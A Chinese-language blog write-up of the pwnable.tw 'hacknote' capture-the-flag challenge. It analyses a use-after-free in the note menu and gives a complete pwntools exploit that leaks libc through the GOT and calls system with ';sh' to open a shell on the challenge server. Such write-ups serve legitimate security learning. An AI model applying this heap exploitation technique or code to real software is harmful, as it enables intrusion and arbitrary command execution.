---
Layout: Post
title: pwnable.tw hacknote
date: 2022-09-01 15:04:01
tags: pwnable.tw
---

UAF，以及发现了使用 `system()` 的小技巧。

## 程序分析

保护：

```txt
[*] '/home/nss/Desktop/pwnable.tw/hacknote/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8047000)
```

作为一个菜单题，本题菜单如下：

```txt
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
```

**Add note：**
申请一个0x16的区块（`malloc(0x8)`）和一个用户决定大小的区块(`malloc(size)`)，我将其称为**控制区块**和**用户区块**。
在控制区块的8字节用户可用空间中，分别塞入一个函数地址、和用户区块的地址。
然后进行 `read(0, malloc(size), size)`，允许用户输入内容至用户区块。

在一个固定地址（`0x0804a050`），存放着一个指针数组，用来存储历次分配产生的控制区块的地址。
为了防止溢出，程序在每次add note时都会先检查全局变量note_count（自己取的名），并且在分配成功后让note_count++。最多可以分配5个区块。

**Delete note：**
输入index，将对应的用户数组和控制数组释放（注意先后顺序）。
但这里并不会让note_count--，也不会从全局指针数组中删除控制区块。**只会free而已。**

**Print note：**
输入index，将对应控制区块的用户可用空间地址压栈（也就是函数的指针的地址），调用对应控制数组存放的函数（该函数会将arg0加4后作为一个 `char*` 调用 `puts` 输出）。

## 漏洞分析

本题没有buffer overflow（都是调用read完成），也没有栈上的漏洞。
唯一的漏洞在于UAF——**程序在使用delete note来free区块之后，依然能够使用print note来使用对应区块存放的数据（具体来说，调用存放的函数指针）。**

所以只需要构造一下，使得**已经被释放的控制区块被分配作用户区块**，这样就可以在控制区块中写入信息，控制控制流。

## 利用 Exploitation

我先随意 `add_note` 两次并释放之，两个原控制区块都被 `free` 到fast bin中。然后再 `add_note(8)`，那么此时原来的两个控制区块，一个被用作新的控制区块，另一个被用作了用户区块。

这时，我往用户区块中塞入两个4Bytes：一个是程序特化的打印函数，会把参数当作地址+4后，调用 `puts` 函数打印之；还有一个是got表中 `puts` 的地址（这里任意got表中函数都可以）。
然后调用print note，这样程序就会把got表中 `puts` 的地址打印出来，那么libc基地址就有了。

之后可以故技重施，再把那两个受害者区块 `free` 再 `malloc` ，此时再往用户区块中塞入两个4Bytes：一个是 `system()` 地址，**另一个是 `b'sh\x00'`**。
由于print note会把对应控制区块的用户可用空间压栈，也就是此时的 `&system()`，所以实际上我执行的是 `system(pack(system()) + ";sh")`，**通过分号来bypass前四个字节的不可打印字符**。

（除该技巧外，别的部分早就想出来了，就该技巧卡了好久，最后看网上wp学到了……）

EXP如下：

```python
from pwn import *
context.arch='i386'
# context.log_level='debug'

filename="./hacknote"
io = process([filename])
elf=ELF(filename)

libc_name="libc_32.so.6"
libc=ELF(libc_name)

def add_note(size, data):
    io.recvuntil(b'Your choice :')
    io.sendline(b'1')
    io.recvuntil(b'Note size :')
    io.sendline(str(size).encode('ascii'))
    io.recvuntil(b'Content :')
    io.send(data)

def delete_note(index):
    io.recvuntil(b'Your choice :')
    io.sendline(b'2')
    io.recvuntil(b'Index :')
    io.sendline(str(index).encode('ascii'))

def print_note(index):
    io.recvuntil(b'Your choice :')
    io.sendline(b'3')
    io.recvuntil(b'Index :')
    io.sendline(str(index).encode('ascii'))

io = remote("chall.pwnable.tw", 10102)

# leak libc_addr (using got["puts"], but actually all got[*] will work as same)
add_note(32, b'/bin/sh')
add_note(32, b'111')
delete_note(0)
delete_note(1)
add_note(8, pack(0x804862b)+pack(elf.got["puts"]))
print_note(0)
# calculate libc_addr
mes = io.recvuntil(b'HackNote')
libc_base = unpack(mes[0:4]) - libc.symbols["puts"]
print(hex(libc_base))

# system(b'\x??'*4 + b';sh\x00')
delete_note(2)
add_note(8, pack(libc_base+libc.symbols["system"])+b';sh\x00')
print_note(0)

io.interactive()
```
